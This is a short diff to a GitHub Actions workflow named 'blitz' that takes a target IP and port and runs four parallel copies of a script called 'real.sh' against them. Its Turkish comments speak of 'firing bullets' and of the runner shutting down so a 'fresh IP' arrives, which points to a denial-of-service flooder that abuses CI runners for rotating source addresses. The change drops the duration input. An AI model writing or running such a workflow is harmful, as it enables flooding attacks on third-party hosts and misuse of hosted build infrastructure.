@@ -9,9 +9,6 @@ on:
       port:
         description: "Target Port"
         required: true
-      time:
-        description: "Duration"
-        required: true
 
 jobs:
   blitz:
@@ -34,7 +31,7 @@ jobs:
         run: |
           # 10 saniye boyunca 8 koldan mermi basıyoruz
           for i in {1..4}; do
-             bash real.sh ${{ inputs.ip }} ${{ inputs.port }} 0.5 ${{ inputs.time }} &
+             bash real.sh ${{ inputs.ip }} ${{ inputs.port }} 0.5  &
           done
           
           # Makine 12 saniye sonra kapanacak, sıradaki taze IP gelecek
